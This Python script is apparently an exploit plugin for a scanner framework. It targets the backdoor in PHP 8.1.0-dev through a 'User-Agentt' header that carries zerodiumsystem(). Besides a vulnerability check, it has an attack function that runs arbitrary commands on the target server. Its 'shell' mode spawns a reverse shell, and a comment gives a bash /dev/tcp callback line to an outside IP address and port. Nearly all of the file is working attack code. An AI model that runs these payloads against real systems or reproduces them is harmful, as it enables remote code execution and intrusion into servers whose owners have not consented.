# !/usr/bin/env python
# coding=utf-8
# ---- ---- ---- ----
# @Author: Guoke324 
# @Date: 2021-08-31 09:22:55
# @Email: querysoft2019@outlook.com
# @LastEditTime: 2021-08-31 09:24:41

import base64
import requests
import http.client
from bs4 import BeautifulSoup
http.client.HTTPConnection._http_vsn = 10 
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'


def vuln_info():
    info = {
        "vulID":"0009",
        "version":"1.0",
        "author":"Guoke324",
        "createDate":"2021-08-31",
        "updateDate":"2021-08-31",
        "vuln_referer":"https://cloud.tencent.com/developer/article/1839234",
        "appName":"php",
        "appversion":"PHP 8.1.0-dev",
        "vuln_name":"PHP 8.1.0-dev后门",
        "vuln_calss":"命令执行",
        "vuln_level":"高危",
        "vuln_description":"漏洞描述:PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送User-Agentt头来执行任意代码，注意：X-Powered-By是响应头里面的内容会泄露php的版本信息，而PHP/8.1.0-dev这个版本的php会有一个后门",
        "vuln_identifier":"漏洞编号：无",
        "exist_poc":"1",
        "exist_exp":"1"
    }
    return info


def vuln_verify(url, head, ctime):
    try:
        result = {"Result":False,"Result_Info":"info","target":"url","vuln_name":"vuln_name","path":"poc_name","level":"level","Error_Info":""}
        HEADERS = {
            'User-Agentt': 'zerodiumsystem("echo test888");'
        }
        HEADERS = {**HEADERS, **head}
        req = requests.get(url, headers=HEADERS, timeout =ctime)
        if 'test888' in req.text:
            result["Result_Info"] = "漏洞存在"
            result['Result'] = True
        else:
            result["Result_Info"] = "漏洞不存在或未知"
            result['Result'] = True           
    except Exception as e:
        result["Error_Info"] = str(e)
    return result

def vuln_attack(url, head, ctime, command, exp_type='cmd'):
    print(command)
    try:
        result = {"Result":False,"Result_Info":"info","target":"url","vuln_name":"vuln_name","path":"poc_name","level":"level","Error_Info":""}
        # print(url, head, ctime, exp_type, command)
        if exp_type == 'cmd':
            HEADERS = {
                'User-Agentt': 'zerodiumsystem("{}");'.format(command)
            }
            HEADERS = {**HEADERS, **head}
            req = requests.get(url, headers=HEADERS, timeout = ctime)
            if req.status_code == 200:
                result["Result_Info"] = req.text
                result['Result'] = True
                # print(url, "漏洞存在")
        if exp_type == "shell":
            # bash -i >& /dev/tcp/192.168.8.117/5555 0>&1
            command = "bash -c 'exec {}'".format(command)
            HEADERS = {
                'User-Agentt': 'zerodiumsystem("{}");'.format(command)
            }
            HEADERS = {**HEADERS, **head}
            req = requests.get(url, headers=HEADERS, timeout = ctime)
            if req.status_code == 200:
                result["Result_Info"] = "shell 反弹成功"
                result['Result'] = True
    except Exception as e:
        result["Error_Info"] = str(e)
    return result
